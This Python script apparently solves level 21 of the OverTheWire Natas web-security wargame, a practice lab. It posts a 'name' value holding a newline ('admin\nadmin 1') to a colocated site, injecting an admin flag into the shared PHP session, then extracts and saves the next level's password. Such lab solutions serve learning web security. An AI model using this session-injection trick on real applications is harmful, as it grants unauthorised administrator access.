import requests
import re
from natas_utility import *
import html

current_level = 21
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url

data = {'name': 'admin\nadmin 1',
        'admin': '1',
        'fontsize': 'aoeu',
        'submit': 'submit'}

session = requests.session()

sess_id = ({'PHPSESSID': session.get(url, auth=auth).cookies['PHPSESSID']})

session.post('http://{}-experimenter.natas.labs.overthewire.org?debug'.format(credentials['username']),
             data=data, auth=auth, cookies=sess_id)

response = session.get(url, auth=auth, cookies=sess_id)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')
password_regex = re.compile(r'Password: (.+)</pre>')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
